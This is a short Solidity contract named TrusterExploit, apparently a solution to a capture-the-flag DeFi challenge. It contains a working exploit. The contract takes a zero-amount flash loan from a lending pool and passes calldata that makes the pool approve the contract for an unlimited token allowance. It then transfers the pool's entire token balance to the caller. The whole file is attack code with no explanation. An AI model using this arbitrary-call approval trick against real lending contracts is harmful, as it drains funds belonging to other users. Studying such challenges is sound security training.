// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface Trust{
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external returns (bool);
}


contract TrusterExploit {
    Trust T;
    ERC20 E;

    constructor(address _token, address _pool) {
        T = Trust(_pool);
        E = ERC20(_token);
    }

    function view_data() public view returns(bytes memory, address, address, address){
        bytes memory _data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
        return (_data, address(this), msg.sender, tx.origin);
    }
    
    function exploit() public {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
        T.flashLoan(0, address(this), address(E), data);
        E.transferFrom(address(T), msg.sender, E.balanceOf(address(T)));
    }

    // receive() external payable{}
}
